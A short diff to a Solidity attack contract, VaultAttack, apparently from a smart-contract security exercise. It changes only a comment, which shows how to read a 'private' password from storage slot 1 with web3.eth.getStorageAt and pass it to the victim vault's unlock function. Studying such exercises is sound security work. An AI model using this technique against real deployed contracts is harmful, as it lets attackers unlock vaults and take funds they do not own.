@@ -13,7 +13,7 @@ contract VaultAttack {
 
     /**
      * @dev To get password from storage, you can run this script in client side:
-     * await web3.eth.getStorageAt(contract.address, 1)
+     * > await web3.eth.getStorageAt(contract.address, 1)
      */
     function attack(bytes32 password) external {
         victimVault.unlock(password);
